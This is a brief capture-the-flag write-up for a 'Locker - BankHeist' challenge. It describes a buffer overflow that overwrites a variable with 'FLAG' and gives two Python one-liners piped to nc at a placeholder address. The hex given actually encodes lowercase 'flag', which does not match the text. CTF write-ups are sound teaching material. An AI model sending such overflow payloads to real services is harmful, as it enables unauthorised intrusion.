# Locker - BankHeist

Super Easy, 

* Overflow the buffer
* Change Specific Variable in the Buffer


### Step 1
so we can overflow buffer by (as there is no checks and they really want us to do this):

```sh
python -c "print('X'*50)" | nc <ipaddress> <port>
```

### Step 2
Now we also get the binary in the challenge (which I lost somehow after the challenge), but basically it was simple logic.

We needed to change the buffer after 60 bytes to `FLAG` in sequence. 

But there was no check before the overflowed buffer and hence we can change it as we please.

So I ended up filling each 4 byte block with `FLAG` in hex ofc. so it's even easier.
```sh
python -c "print('\x66\x6c\x61\x67'*100)" | nc <ipaddress> <port>

```

And we got the flag.


